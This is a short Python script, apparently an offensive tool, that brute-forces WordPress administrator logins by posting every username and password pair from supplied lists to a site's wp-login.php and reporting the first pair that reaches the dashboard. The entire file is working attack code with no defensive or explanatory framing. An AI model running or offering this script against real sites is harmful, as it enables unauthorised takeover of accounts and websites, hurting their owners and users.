import requests

def try_login(target, username, password):
    login_url = f"{target}/wp-login.php"
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': f"{target}/wp-admin/",
        'testcookie': '1'
    }
    headers = {'User-Agent': 'Mozilla/5.0'}

    try:
        res = requests.post(login_url, data=data, headers=headers, timeout=10)
        if "dashboard" in res.text.lower() or res.url.endswith("wp-admin/"):
            print(f"[✓] SUCCESS: {username}:{password}")
            return True
        else:
            print(f"[-] FAILED: {username}:{password}")
    except Exception as e:
        print(f"[!] Error trying {username}:{password} -> {e}")
    return False

def brute_force_login(target, user_list, pass_list):
    print(f"\n[*] Starting brute force on: {target}")
    for user in user_list:
        for pwd in pass_list:
            if try_login(target, user, pwd):
                return user, pwd
    return None, None
